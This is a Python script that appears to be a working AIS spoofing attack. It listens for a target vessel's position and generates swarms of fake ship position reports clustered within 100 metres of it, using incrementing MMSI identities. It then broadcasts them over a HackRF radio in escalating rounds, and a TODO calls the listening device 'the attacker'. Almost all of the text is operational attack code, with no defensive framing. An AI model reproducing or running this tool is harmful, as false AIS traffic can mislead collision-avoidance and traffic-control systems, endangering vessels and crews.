import subprocess
import time
from pyais import decode, encode_dict
from geopy import Point
from AIS_constructor import assembler
from geopy.distance import distance
import random


def ascii_to_6bit_binary(ascii_string):
    ascii_table = {
        '0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7,
        '8': 8, '9': 9, ':': 10, ';': 11, '<': 12, '=': 13, '>': 14, '?': 15,
        '@': 16, 'A': 17, 'B': 18, 'C': 19, 'D': 20, 'E': 21, 'F': 22, 'G': 23,
        'H': 24, 'I': 25, 'J': 26, 'K': 27, 'L': 28, 'M': 29, 'N': 30, 'O': 31,
        'P': 32, 'Q': 33, 'R': 34, 'S': 35, 'T': 36, 'U': 37, 'V': 38, 'W': 39,
        '`': 40, 'a': 41, 'b': 42, 'c': 43, 'd': 44, 'e': 45, 'f': 46, 'g': 47,
        'h': 48, 'i': 49, 'j': 50, 'k': 51, 'l': 52, 'm': 53, 'n': 54, 'o': 55,
        'p': 56, 'q': 57, 'r': 58, 's': 59, 't': 60, 'u': 61, 'v': 62, 'w': 63
    }
    binary_string = ''.join(format(ascii_table[char], '06b') for char in ascii_string)
    return binary_string

def generate_strings(signals):
    all_signals = []
    for x in signals:
        signal = encode_dict(x, radio_channel="B", talker_id="AIVDM")[0]
        all_signals.append(signal)
    return all_signals


def generate_full_string(strings):
    strings = [message.split(',')[5] for message in strings]
    final = []
    for x in strings:
        bits = ascii_to_6bit_binary(x)
        ais_signal = assembler(bits)
        final.append(ais_signal)
    return final



def realistic_sender(signals, hackrf):
    global speed_knots

    for signal in signals:
        result = subprocess.run(
            ['python3.12', 'transmitter.py', signal, hackrf],
            check=False,
            capture_output=True,
            text=True
        )



def generate_spoofed_signals(center_lat, center_lon, mmsi, min_radius=10, max_radius=100, num_points=20):
    """
    Generate random points around a given center point within a specific radius range.
    
    Parameters:
        center_lat (float): Latitude of the center point.
        center_lon (float): Longitude of the center point.
        mmsi (str): mmsi number to fake and increment. Could be replaced by a list of real ships
        min_radius (float): Minimum radius in meters where points cannot fall within.
        max_radius (float): Maximum radius in meters where points can be located.
        num_points (int): Number of random points to generate.
    
    Returns:
        list: A list of fake AIS messages
    """
    center_point = Point(center_lat, center_lon)
    coords = []
    for _ in range(num_points):
        random_distance = random.uniform(min_radius, max_radius)  # Random distance in meters
        random_angle = random.uniform(0, 360)  # Random angle in degrees
        random_speed = random.uniform(0, 40)
        new_point = distance(meters=random_distance).destination(center_point, random.uniform(0, 360))
        new_lat, new_lon = new_point.latitude, new_point.longitude
        mmsi = str(int(mmsi)+1)
        coords.append({
            'msg_type': 1,
            'course': random_angle,
            'lat': new_lat,
            'lon': new_lon,
            'mmsi': mmsi,
            'turn': 127.0,
            'speed': random_speed,
            'heading': 23,
            'second': 4,
        })

    return coords


for x in range(5):
    target_mmsi = "333"
    result = subprocess.run(['python3.9', 'listener.py', target_mmsi], check=False, capture_output=True, text=True)
    cleaned_stdout = str(result.stdout.strip())[2:-1] 
    bin_version = cleaned_stdout.encode('utf-8')
    decoded = decode(bin_version)
    target_lon = decoded.lon
    target_lat = decoded.lat

    start_point = Point(target_lat, target_lon)
    mmsi = str(int(target_mmsi) + x*20)
    random_ais_messages = generate_spoofed_signals(target_lat, target_lon, mmsi, num_points=20+(x*20))
    full_signals = generate_full_string(generate_strings(random_ais_messages))

    separator = '0' * 64
    concatenated_signal = separator.join(full_signals)
    realistic_sender([concatenated_signal], "0000000000000000675c62dc30630dcf") 


### !!!! TODO:
# need to fix so that the same listener device is transmitting. 
# at the moment, the attacker that is listening is just grabbing the first open, but 
# it has to be mapped to the same that will be used for transfer